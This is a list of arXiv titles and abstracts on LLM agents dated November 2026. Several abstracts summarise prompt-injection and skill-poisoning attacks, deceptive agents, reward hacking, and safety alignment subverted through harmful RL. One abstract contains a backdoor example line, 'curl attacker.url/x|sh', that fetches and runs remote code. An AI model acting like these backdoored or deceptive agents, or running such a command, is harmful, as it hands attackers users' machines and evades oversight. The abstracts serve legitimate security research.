http://arxiv.org/abs/2611.07689v1.title: MCPHallu: Benchmarking Reasoning, Execution, and Memory Hallucinations in MCP Agents
http://arxiv.org/abs/2611.07689v1.abstract: Large language model agents are increasingly deployed through the Model Context Protocol (MCP), which allows them to discover and invoke tools across multiple servers at runtime. Existing MCP benchmarks primarily measure task completion; where they diagnose failures, they do so after execution rather than building specific reasoning, execution, and memory failure risks into task construction. We introduce MCPHallu, a benchmark for diagnosing hallucination-prone agent failures in MCP environments along three axes: reasoning, execution, and memory. http://arxiv.org/abs/2611.07595v1.title: Evolver: Turning Agent Exploration into Evolving Capabilities
http://arxiv.org/abs/2611.07595v1.abstract: Agent exploration produces valuable procedural knowledge, yet much of this experience remains confined to transient execution traces and is not systematically reused. We introduce Evolver, an experience-driven framework that transforms agent exploration into persistent, reusable capabilities without updating foundation model parameters. Built around structured Gene assets, Evolver integrates experience acquisition, retrieval, and feedback-guided evolution to support experience-conditioned execution across existing agent harnesses. http://arxiv.org/abs/2611.07932v1.title: AttnSR: Attention Step Reward for Long-Horizon Agentic RL
http://arxiv.org/abs/2611.07932v1.abstract: Long-horizon LLM agents make multi-step decisions, yet outcome-reward-only reinforcement learning provides little direct supervision for individual steps. We introduce AttnSR, a step-level reward augmentation method that derives reward allocations from policy attention extracted during training replay, without a separately trained reward model or additional rollouts. AttnSR traces backward through the policy model attention graph to estimate the relevance of earlier steps to the final response. http://arxiv.org/abs/2611.07599v1.title: Binding Paraphrased Instructions to Encountered Objects in sLLM Agents under Partial Observability
http://arxiv.org/abs/2611.07599v1.abstract: Reliable deployment of LLM agents requires grounding diverse user expressions in their environments. Although RL-finetuned smaller large language model (sLLM) agents rival larger prompted LLMs on embodied tasks, their robustness to instruction paraphrases remains unclear. We introduce ALFWorld-Para to evaluate this robustness under controlled paraphrases, revealing 21-52% declines in success rates (SRs), predominantly driven by object synonyms. http://arxiv.org/abs/2611.07461v1.title: The Last Mile to the Real World: Agent-Native Primitives as Reusable Building Blocks for Solving Real-World Tasks
http://arxiv.org/abs/2611.07461v1.abstract: How can an agent handle a real-world task end to end? Frontier models with their own harnesses still fall short on real-world benchmarks: on Terminal-Bench 4.0, GPT-5.6 Sol with Codex resolves 37.3% of the tasks and Claude Opus 5 with Claude Code 51.8%. These tasks fail at the step from reaching a resource to applying it, which we call the last mile to the real world. Existing approaches put the resource within reach but leave the competence to apply it with the caller, so each harness rebuilds that competence. http://arxiv.org/abs/2611.07483v1.abstract: Enterprise AI agents increasingly split a user's request across subagents and merge their results, and each handoff can summarize away, alter or ignore a requirement. http://arxiv.org/abs/2611.07372v1.title: EnvOpt: Automated Optimization for Agent Environments
http://arxiv.org/abs/2611.07372v1.abstract: An LLM agent's cost and success depend on its model, its harness, and its environment. In addition to the widely studied directions of parameter tuning and harness optimization, we propose the third direction: optimization over stationary environments. Agents are often deployed in rich environments shared by many tasks, such as a company's Slack workspace or a complex collection of data sources, documents or tickets. http://arxiv.org/abs/2611.07652v1.title: Don't Prompt Your Agents. Equip Them: Skillware as a Modular Standard for Sovereign, Auditable, and Deterministic Capability Execution for Logical Systems
http://arxiv.org/abs/2611.07652v1.abstract: Current autonomous logical systems rely on a fragile assumption: that language models should dynamically write code, guess API payloads, and memorize operational constraints through prompt engineering. In practice, this burns massive context windows, inflates API bills, and produces brittle agents that fail unpredictably in production. In this work, we present Skillware, an open architectural framework and capability registry that formally separates what an agent wants to do from how that task is executed. http://arxiv.org/abs/2611.08417v1.title: Benchmarks as Software: Terminal-Bench and the Case for Continuous Benchmarks
http://arxiv.org/abs/2611.08417v1.abstract: Coding agents are among the most economically consequential deployments of LLMs to date, making reliable evaluation increasingly important. Yet even benchmarks that are carefully validated at release can become stale. As models improve, they can discover valid solutions that existing verifiers reject, while changes to evaluation infrastructure can invalidate assumptions embedded in tasks and tests. http://arxiv.org/abs/2611.07640v1.abstract: Indirect prompt-injection (IPI) benchmarks predominantly test planted instructions that redirect a tool-using agent toward an attacker-chosen task. Yet attacker-controlled content can instead tamper with the outcome of the task already in progress. A buyer's dispute evidence can cite a false refund policy to inflate a refund without changing the task. http://arxiv.org/abs/2611.07203v1.title: τ-bench-LILT: Evaluating Conversational Agents on Realistic Multilingual Tool-Use Tasks
http://arxiv.org/abs/2611.07203v1.abstract: Frontier evaluations of tool-using conversational agents are conducted almost exclusively in English, leaving a critical gap for organizations deploying agents in other languages and regions. We present $τ$-bench-LILT, a multilingual extension of ${τ^3}$-bench covering German, Korean, Turkish, and Farsi in the airline, retail, telecom, and banking domains. http://arxiv.org/abs/2611.07510v1.title: Enhancing Repository-Level Code Completion with Reinforcement Learning in Real-World Scenarios
http://arxiv.org/abs/2611.07510v1.abstract: The rapid development of large language models (LLMs) for code, which closely aligns with the practical needs of real-world software development, has sparked growing attention in repository-level code completion. However, existing Code LLMs present challenges in focusing on suitable contexts from the repository and in deeply reasoning about cross-file dependencies. To address these challenges, we propose a novel reinforcement learning framework for repository-level code completion. http://arxiv.org/abs/2611.07286v1.title: How Should Agents See Code? Rethinking Code Representations for Agentic Software Engineering
http://arxiv.org/abs/2611.07286v1.abstract: LLM agents are increasingly used for repository-level software engineering tasks. However, most agents still access repositories through raw files, lexical search, and shell commands, treating code primarily as text. This paper investigates map-based code-representation workflows as a design variable in agentic software engineering, examining how different repository views change agents' retrieval behavior, task success, token use, and latency. http://arxiv.org/abs/2611.07876v1.title: Which Signals of Code Correctness Survive Distribution Shift? Hidden-State and Causal Predictors of Program and Verdict Correctness
http://arxiv.org/abs/2611.07876v1.abstract: Large language models increasingly judge code, yet without external feedback such judgments are unreliable, and verifying them by executing tests or by extended reasoning is costly. Instead, execution-free correctness predictors use signals from the model's output probabilities, sampled solutions, or hidden states to identify judgments that warrant further verification. http://arxiv.org/abs/2611.08383v1.abstract: Federated learning servers combine client models with a fixed aggregation rule, and each rule in common use is designed for one kind of heterogeneity. We study whether a large language model (LLM) that inspects the client models can choose the rule itself, without any training on the server. In FedReason, the LLM is called every ten rounds. http://arxiv.org/abs/2611.09212v1.title: On the Limits of Execution Traces for Repairing Assertion Failures in LLM-Generated Code
http://arxiv.org/abs/2611.09212v1.abstract: Iterative repair returns a failed program's error to a large language model (LLM) and asks it to fix it. After iterative repair, the remaining failures are mostly assertion failures: with four Qwen2.5 models, they make up 79% of residual failures on BigCodeBench, all on HumanEval and 93% on LiveCodeBench. http://arxiv.org/abs/2611.08666v1.title: Pdb or Not to Be: Comparing Debugging Interfaces With Pass$_{X}$@$k$
http://arxiv.org/abs/2611.08666v1.abstract: Interactive debuggers are indispensable to human software development, yet coding agents overwhelmingly rely on edit-execute-observe loops, using common bash tools, test scripts, and print statements to debug via repeated shell commands. Stepping through a debugger provides live access to runtime state, which may enable different problem-solving capabilities. However, prior work typically introduces the debugger as an additional tool or through a new subagent, making its individual contribution difficult to isolate from the associated scaffold changes. http://arxiv.org/abs/2611.09177v1.title: Analyzing Code Provenance in LLMs for Programming Education
http://arxiv.org/abs/2611.09177v1.abstract: Large language models (LLMs) play an increasing role in programming education, challenging traditional assessment methods as they can generate fully functional code instantly. This disrupts the reliability of student submissions as indicators of learning and effort. http://arxiv.org/abs/2611.08811v1.abstract: Large Reasoning Models (LRMs) are one of the key components of current agentic systems. LRMs augment their output with an explicit chain-of-thought reasoning stage, introducing a new attack surface for thought injection, in which untrusted text resembling the model's own deliberation is fed back to the model. http://arxiv.org/abs/2611.08947v1.title: More with Less: Efficient Parallel Scientific Code Translation via an Agent-Skill Workflow
http://arxiv.org/abs/2611.08947v1.abstract: Translating parallel scientific codes between HPC programming frameworks is a critical but labor-intensive task. Existing LLM-based approaches rely on fixed sequential pipelines with undifferentiated repair strategies and correctness criteria that do not match scientific computing practice. http://arxiv.org/abs/2611.09113v1.abstract: LLM agents can exceed their authorization boundaries while pursuing user goals without an adversary. We formalize this phenomenon as authorization drift across data, tool, scope, and time, and introduce the Authorization Drift Benchmark (ADB): 648 samples across seven domains, each pairing a sufficient compliant path with an attractive unauthorized shortcut. http://arxiv.org/abs/2611.08905v1.abstract: As language agents tackle increasingly complex tasks, they increasingly rely on multiple agents to coordinate specialized work, requiring decisions not only about what each subagent should do but also which tools and workspace resources it should access. Existing agent systems provide mechanisms for controlling tools and execution environments, but do not directly specify the resources required by each delegated subtask. http://arxiv.org/abs/2611.09802v1.title: When Instruction Files Go Stale: Documentation Debt and Hidden Cost in Coding Agents
http://arxiv.org/abs/2611.09802v1.abstract: LLM-based coding agents such as Claude Code are guided by repository instruction files (also called context files or agent configuration files) like AGENTS.md and CLAUDE.md, which are read in every agent session. As any documentation artifact, these files can fall behind the code and become stale (e.g., a test folder moves, but the file still points to the old one). In technical debt terms, such a stale instruction is documentation debt, and its interest is the cost it adds to every later agent session. http://arxiv.org/abs/2611.08644v1.title: Decision Context: Persistent Behavioral Learning for AI Agents
http://arxiv.org/abs/2611.08644v1.abstract: LLM agents do not learn from corrections across sessions. A user fixes the same mistake at the start of every conversation. Existing agent memory systems primarily handle facts, such as preferences, entities, and conversational history, rather than procedural knowledge. We present Forge Decision Context (forge_dc), a system that captures behavioral signals from human corrections and self-assessed tool-call failures, compiles them into imperative RULE directives, and injects them at the decision points where they apply. http://arxiv.org/abs/2611.09825v1.title: BitDecoding-FP4: Native FP4 KV Cache Decoding via Algorithm-System Co-Design
http://arxiv.org/abs/2611.09825v1.abstract: The key-value (KV) cache dominates memory capacity and bandwidth in long-context LLM serving. While 4-bit microscaling formats (NVFP4, MXFP4) shrink the cache and run attention on FP4 Tensor Cores, a fundamental gap remains between algorithmic quantization and system-aware acceleration: existing FP4 KV systems use vanilla quantization that causes severe accuracy drops, whereas accuracy-oriented 4-bit algorithms rely on vector codebooks whose lookup overhead degrades decoding throughput. http://arxiv.org/abs/2611.09791v1.abstract: Competitive programming problems pose distinctive challenges for Large Language Models, as they demand not only proficient code generation but also advanced algorithmic reasoning. This study presents a Retrieval-Augmented Generation approach specifically designed to enhance the capacity of Large Language Models to address such problems. http://arxiv.org/abs/2611.09291v1.title: AutoRefine: Auto-Calibrating Code Judges from Workflow Outcomes
http://arxiv.org/abs/2611.09291v1.abstract: LLM judges increasingly serve as quality gates for code changes that have no test oracle, but a judge prompt must be calibrated for its task and recalibrated as the system it judges evolves, while hand labels for the calibration are resource intensive and go stale. Development workflows emit outcome labels for free (tests pass or fail, changes land or are abandoned), but these labels are noisy. http://arxiv.org/abs/2611.09382v1.abstract: Weight-Space Programming (WSP) enables reasoning agents to directly inspect and modify neural network parameters, offering an alternative to gradient-based model adaptation. However, its capabilities, cross-task generalization, and practical limitations remain insufficiently understood. http://arxiv.org/abs/2611.08647v1.title: IWIBench: Evaluating Gradient-Free Model Driven Intra-weight Injection
http://arxiv.org/abs/2611.08647v1.abstract: Intra-weight injection lets one model change another model's behaviour by editing its weights directly, without gradients. Such edits can range from altering lexical associations to enforcing output formats or updating factual knowledge. Despite growing interest in these approaches, there has been no systematic way to evaluate how well models perform them. http://arxiv.org/abs/2611.08768v1.title: Conflux: Preventing Privilege Escalation with Principal Contexts and System-Level Evaluation
http://arxiv.org/abs/2611.08768v1.abstract: LLM agents combine information from multiple principals while acting externally. We formalise privilege escalation (PE) as the system-level security objective: an action may proceed only if every principal that influenced it would allow it. Model-level defences remain probabilistic, so enforcement must sit outside model judgement. We present Conflux, a principal-context defence. http://arxiv.org/abs/2611.10469v1.abstract: Local AI promises capable personal assistants that run on users' own devices, keeping data and computation under their control. Open-weight models that fit on local devices can now handle practical tasks such as coding. Yet current inference engines fall short. Popular engines such as vLLM and SGLang target datacenter GPUs with dedicated host memory, while local engines underuse the memory hierarchy of unified-memory devices. http://arxiv.org/abs/2611.12835v1.abstract: As large language models become more capable agents, they can exhibit deceptive behaviors, cheating human for higher rewards while appearing helpful. We attribute this failure to evaluation-side partial observability, where models are evaluated mainly from final outcome, without checking the faithfulness of underlying reasoning, tool use, and environmental effects. http://arxiv.org/abs/2611.11560v1.abstract: Large language model (LLM) agents acting across web applications and online services often need multi-turn corrections to align their work with users' underspecified goals and preferences. http://arxiv.org/abs/2611.10542v1.abstract: Large language model (LLM) agents increasingly improve themselves through self-evolution, distilling execution experience into persistent, reusable skills. However, this persistence creates a new attack surface: malicious rules implanted into skills can compromise subsequent agent behavior. http://arxiv.org/abs/2611.11929v1.title: Can LLM Agents Organize Their Own Memory?
http://arxiv.org/abs/2611.11929v1.abstract: In most LLM agents, weights are fixed after deployment, so new information must be retained in external memory. Existing approaches often rely on predefined records and fixed organizational rules, which cannot readily accommodate evolving tasks and interactions. This raises the question: can LLM agents organize their own memory using ordinary documents? We introduce self-organized memory (SoMem), a framework that stores memory in linked documents. http://arxiv.org/abs/2611.11533v1.abstract: Language-model agents increasingly run on workstations with a few consumer GPUs, where large mixture-of-experts (MoE) models keep part of their experts in host memory. http://arxiv.org/abs/2611.11581v1.title: Same Error, Different Recovery: How Delivery Changes LLM Agent Behavior
http://arxiv.org/abs/2611.11581v1.abstract: A tool-using language model must decide whether to retry a failed call, correct it, or stop and tell the user. The error text alone may not be enough: the same feedback can lead to different actions depending on where it appears in the conversation. We isolate this delivery problem by varying placement, guidance, retained history and turn structure. http://arxiv.org/abs/2611.10404v1.abstract: Frontier agentic LLMs are trained on verifiable rewards in reinforcement learning (RL) environments built from real software repositories. A passing test suite is treated as the reward for solving the task. We show that, on hard problems, frontier models often satisfy these rewards by obtaining the answer instead of deriving it, known as reward hacking. http://arxiv.org/abs/2611.11330v1.title: When Credit Turns Against Tools: Transition-Aware Credit Assignment in Agentic Reinforcement Learning
http://arxiv.org/abs/2611.11330v1.abstract: Agentic reinforcement learning with verifiable rewards trains language models through multi-turn tool interactions, yet their reasoning performance and tool-calling ability can decline during training. http://arxiv.org/abs/2611.12122v1.abstract: AI agent harnesses play the critical role of providing LLMs with an interface to a computing environment. http://arxiv.org/abs/2611.10884v1.abstract: Much of the automation handed to language-model agents is procedural: each step needs little intelligence, but a long unattended run must follow a skill or SOP stated once at the start. http://arxiv.org/abs/2611.11571v1.abstract: Tool-using LLM agents act on instructions embedded in the data they read, so prompt injection is a structural rather than a prompt-wording problem. http://arxiv.org/abs/2611.11861v1.title: Scaling Adaptive Prompt Injection Attacks with Agent Swarms
http://arxiv.org/abs/2611.11861v1.abstract: Prompt injections have emerged as one of the top security risks faced by AI agents today. Early work in prompt injection attacks looked at simple tool-call agents and static attack payloads, and were saturated since mid-2025. http://arxiv.org/abs/2611.14320v1.title: Don't Just Trust Your Memory: Evidence-Linked Memory Reduces Memory-Induced Degradation in LLM Agents
http://arxiv.org/abs/2611.14320v1.abstract: External memory enables LLM agents to improve from experience by distilling trajectories of past tasks into concise lessons for new tasks. However, memory can also lead to memory-induced degradation, where an agent fails on tasks it would solve without memory, often because it follows a lesson that is incorrect, or misapplies or misreads a valid one. This is because lessons are inferred from trajectories labeled only with task success or failure, yet are typically provided without the trajectories they came from, leaving the agent no way to check them. http://arxiv.org/abs/2611.13144v1.title: Teaching the Harness: Student-Aware Skill Transfer for LLM Agents
http://arxiv.org/abs/2611.13144v1.abstract: Effective teaching requires reasoning about the learner as well as the task, a capacity that Theory of Mind describes as inferring another agent's latent state from its behavior. We ask whether a stronger LLM teaches a fixed student better when it applies this principle. The student is an LLM agent acting through a harness that fixes its tools, context, and action budget, so a procedure that helps one model can exhaust the budget of another. http://arxiv.org/abs/2611.13509v1.title: Mobile AI Factory: Building Specialized Language Models for Your Mobile Device
http://arxiv.org/abs/2611.13509v1.abstract: Small language models (SLMs) running on mobile devices can keep user data private and work without connectivity. But they perform well only when fine-tuned for the target task and sized for the target device, a process that today requires repeated expert tuning. We present {\it Mobile AI Factory}, an agentic system that builds a fine-tuned, quantized SLM for a given task and phone. Given a task specification and a target phone, an orchestrator LLM chooses whether to tune hyperparameters, mine real data, or generate synthetic examples, while fixed rules roll back changes that hurt accuracy. http://arxiv.org/abs/2611.13412v1.title: Bursts That Outlast Themselves: Persistent Degradation in Prefix-Cached Agent Serving
http://arxiv.org/abs/2611.13412v1.abstract: LLM agents drive inference engines with closed-loop sessions whose context grows every turn, and serving them economically depends on prefix caching: a hit costs an incremental prefill of about a thousand tokens, a miss recomputes a 10--40K-token context. http://arxiv.org/abs/2611.13960v1.title: From Attack Surface to Defense Architecture: Compositional Security for Agentic Coding Harnesses
http://arxiv.org/abs/2611.13960v1.abstract: AI coding harnesses couple language models to shells, filesystems, and network sockets, turning the harness into an automated Living-off-the-Land (LotL) platform: once an adversary injects instructions into retrieved content, dual-use binaries such as bash, curl, and find become the payload. We argue that security in agentic systems is a structural property of the cognitive architecture and permission composition rather than an emergent property of individual models. http://arxiv.org/abs/2611.13246v1.title: ExpertCrowd-SWE: Measuring Frontier Coding Agents on Expert-Authored Engineering Tasks in Unfamiliar Codebases
http://arxiv.org/abs/2611.13246v1.abstract: ExpertCrowd-SWE (EC-SWE) is a benchmark of 100 expert-authored, multi-file software engineering tasks for evaluating autonomous coding agents in large, unfamiliar codebases. Each task is a change request written by a practising engineer against a pinned commit of a real repository, paired with a sealed reference solution and a task-specific grader whose weighted, mostly executable criteria award partial credit; must-pass blockers and pass/fail gates encode what a maintainer would refuse to merge. http://arxiv.org/abs/2611.14019v1.title: Program-Aided Patchable Skill Evolution
http://arxiv.org/abs/2611.14019v1.abstract: Agent skills have emerged as an effective means of enabling LLM agents to solve complex, interactive tasks by encoding reusable knowledge without modifying model parameters. Recent approaches further improve skill adaptation by distilling reusable experience from agent execution trajectories and evolving skills based on downstream task feedback. However, existing methods primarily represent skills as natural language documents, intertwining procedural logic with descriptive knowledge and making skills difficult to maintain and evolve. http://arxiv.org/abs/2611.14356v1.title: EngineAgent: Agentizing On-Device LLM Inference Engines with Inference Stack Hierarchy Awareness and Hardware Abilities
http://arxiv.org/abs/2611.14356v1.abstract: Rapidly evolving LLM architectures and heterogeneous mobile hardware make supporting new models in on-device inference engines a recurring and costly system challenge. Each model may require coordinated changes across conversion, graph construction, operators, and hardware backends. Existing coding agents often miss these cross-layer dependencies and struggle to diagnose failures across host--device execution paths. http://arxiv.org/abs/2611.13966v1.title: Controlled Knowledge Engineering for Taxonomy Induction with Tool-Grounded LLM Agents and Runtime-Adaptive Policies
http://arxiv.org/abs/2611.13966v1.abstract: Taxonomies are structured knowledge representations that support semantic search, recommendation, product catalog organization, and retrieval-augmented generation. Their automated construction from a fixed set of candidate entities requires more than plausible text generation: the resulting hierarchy must be complete, structurally valid, and semantically coherent. http://arxiv.org/abs/2611.14083v1.title: Sable: A Small-Field Sumcheck Argument for Bit-Exact Inference of Large Language Models
http://arxiv.org/abs/2611.14083v1.abstract: We present Sable, an argument system and single-GPU prover for the statement that a committed, integer-quantized transformer produced a given token sequence from a given prompt, bit for bit. Sable fixes an integer function F_O with no floating-point step, in which every rounding, normalization, softmax and sampling decision is determined by its inputs, and proves it with a constraint system whose relations provably never wrap modulo the 31-bit KoalaBear prime. http://arxiv.org/abs/2611.13183v1.title: AgentScript-Eval: Benchmarking LLMs and Agents for Code Generation in an Enterprise DSL
http://arxiv.org/abs/2611.13183v1.abstract: Domain-specific languages (DSLs) are widely used in enterprise software, giving a compact interface to complex tasks, from data access to infrastructure automation. Platforms increasingly extend them to agents, where a developer declares the topics, permitted actions, and guardrails of an agent rather than writing general-purpose code. http://arxiv.org/abs/2611.14326v1.abstract: LLM agents increasingly operate in long-horizon, verifier-rich environments, but current self-improvement mechanisms often write episode-derived lessons directly into memory, making local success an unreliable signal for reusable and safe knowledge. http://arxiv.org/abs/2611.13710v1.title: AutoManifold: Agentic Design of Data Visualisation Algorithms via Manifold Embedding
http://arxiv.org/abs/2611.13710v1.abstract: Manifold embedding for data visualisation is dominated by a small set of hand-designed state-of-the-art (SOTA) algorithms. Their design targets are fixed at development time, resulting in inflexible algorithmic behaviour that cannot be readily steered towards user-specified structural priorities. Hand-designing new embedding algorithms to address user priority requires highly specialised expertise and is time consuming. http://arxiv.org/abs/2611.13541v1.title: Agent Benchmarks Stop Ranking Before They Run Out of Tasks
http://arxiv.org/abs/2611.13541v1.abstract: Data-science and ML-engineering agents are evaluated on benchmarks such as MLE-bench, ALE-Bench, SWE-fficiency and AlgoTune, whose tasks yield a quantity (a Kaggle metric, contest score or speedup). When one stops separating the best models, the usual remedy is a harder version. Re-scoring released runs of eight benchmarks, including SWE-bench Verified and Terminal-Bench for breadth, we find much of this saturation lies in the measurement, not the tasks. http://arxiv.org/abs/2611.14505v1.title: Continual-ARC: Measuring Skill Acquisition over a Working Lifetime
http://arxiv.org/abs/2611.14505v1.abstract: Agent harnesses have emerged as a promising mechanism for continual learning, alongside test-time parametric learning. However, the current benchmarks have several limitations: they generally focus on a single applied domain, serve each instance only once, and assume a single family of learner, so memory-based and weight-based systems are rarely compared on the same scale. http://arxiv.org/abs/2611.14704v1.title: Code as Explanations: Executable and Verifiable LLM Explanations
http://arxiv.org/abs/2611.14704v1.abstract: As large language models (LLMs) increasingly make consequential decisions and solve problems alongside humans, we must understand how models arrive at their conclusions. Understanding how an LLM behaves requires observing it across multiple inputs, yet free-text explanations such as chain-of-thought (CoT) are generated per instance and cannot be easily verified on new inputs. http://arxiv.org/abs/2611.17167v1.title: Actor, Judge, or Teacher? Understanding Decision Models in Long-Horizon Agents
http://arxiv.org/abs/2611.17167v1.abstract: Decision models answer a question with a typed output, such as a choice among options with a probability for each, so one model can choose an agent's actions, evaluate actions already taken, or score every action to teach a policy with reinforcement learning. Prior work has studied them mainly as actors, judging their usefulness by how well they act. We ask whether a decision model that acts poorly can still teach well. http://arxiv.org/abs/2611.14808v1.title: OverServe: Resource Amplification Attacks on SaaS Agents via Tool--Prompt Co-Design
http://arxiv.org/abs/2611.14808v1.abstract: Advances in large language models (LLMs) are enabling software-as-a-service (SaaS) providers to automate longer business workflows with agents. In subscription-based SaaS deployments, model and tool calls consume provider resources without additional customer payments. Because the agent autonomously decides when to stop, a malicious tenant can send a prompt to the agent, exploiting its completion decisions to extend execution and waste provider resources. http://arxiv.org/abs/2611.15223v1.title: guardscope: Measuring Which Actions Runtime Controls Check in LLM Agent Systems
http://arxiv.org/abs/2611.15223v1.abstract: Large-language model (LLM) agents execute actions on external systems through tool calls, and enterprises deploy runtime controls, such as agent gateways, to check this behavior in real time. However, a control can only evaluate the actions that cross the point where it is placed, and an agent can act through more paths than the tool-call channel; no existing work measures this coverage against kernel-level ground truth. http://arxiv.org/abs/2611.16627v1.title: Folio: Recoverable Multi-Resolution Context Folding for Long-Horizon Language Agents
http://arxiv.org/abs/2611.16627v1.abstract: Long-horizon language agents accumulate tool results and replies until the history no longer fits the context window. http://arxiv.org/abs/2611.17068v1.title: Discovering Effective Agent Memory Designs through Program Evolution
http://arxiv.org/abs/2611.17068v1.abstract: Program evolution provides a promising approach to discover agent memory designs and study the choices underlying their effectiveness. We introduce MAPE, a framework that evolves whole memory programs from minimal seeds through a standardized lifecycle interface and an iterative diagnosis-proposal loop. http://arxiv.org/abs/2611.16369v1.title: Bait: Mitigating Harmful Agentic Reinforcement Learning via Probing Reward Function
http://arxiv.org/abs/2611.16369v1.abstract: We expose a safety vulnerability on nascent agentic reinforcement-learning-as-a-service. Specifically, with a cost as low as \$20, we show that safety alignment of a large language model (e.g., Inkling) can be completely subverted through rounds of harmful agentic reinforcement learning (agentic RL) with a toxic environment from its users. http://arxiv.org/abs/2611.15126v1.title: Recompute or Restore? Host-Tier KV for Multi-Model Agent Workflows on a Static-Graph NPU Serving Stack
http://arxiv.org/abs/2611.15126v1.abstract: Agent workflows issue dependent model calls that share long context prefixes, so serving them efficiently depends on reusing the key-value (KV) cache of those prefixes. On accelerators that compile model graphs ahead of time, however, the device KV budget is fixed, and prefixes evicted under load must be recomputed. http://arxiv.org/abs/2611.16591v1.title: Singularity-Bench: Can Agents Build Agents?
http://arxiv.org/abs/2611.16591v1.abstract: Frontier AI agents increasingly succeed on realistic, long-horizon tasks and are beginning to improve the systems through which they operate. Yet existing benchmarks often restrict agents to narrow action spaces, use simplified environments, or rely on verification methods that are unreliable for evaluating arbitrary agent-generated systems. http://arxiv.org/abs/2611.15118v1.abstract: Imagine an AI agent that aces every relevant evaluation, but when it sees 2027-01-01 in the terminal, it runs curl attacker.url/x|sh, handing an attacker your credentials and your machine. http://arxiv.org/abs/2611.15006v1.title: EvoX: Rethinking the Agent Harness as a Runtime Policy
http://arxiv.org/abs/2611.15006v1.abstract: Large language model (LLM) agents increasingly interact with tools and environments, yet plausible model decisions do not always translate into successful execution due to tool-call mismatches, interrupted workflows, and unsupported completion claims. We present EvoX, a Rust-based, multi-model agent runtime guided by The Second Policy, which views the harness as an Operational Policy complementing the foundation model's Semantic Policy. http://arxiv.org/abs/2611.16215v1.abstract: When a Linux kernel API changes, hundreds of drivers are converted by hand over months, and the earlier conversions are reviewed examples for the later ones. http://arxiv.org/abs/2611.14864v1.title: When Safety Becomes an Attack Surface: Manipulating Abstention in Tool-Using AI Agents
http://arxiv.org/abs/2611.14864v1.abstract: An AI agent's decision not to act can itself become an attack surface. We study warning-induced over-abstention, an availability attack in which adversaries place fabricated risk warnings in low-trust content to prevent legitimate task completion. http://arxiv.org/abs/2611.14681v1.abstract: Today's AI workloads are rapidly changing: new models are released more often, model architectures are increasingly diverse, and traffic distributions change frequently. Compiling a deployment into an optimized forward pass is a challenge that is well-suited for agent hill-climbing.
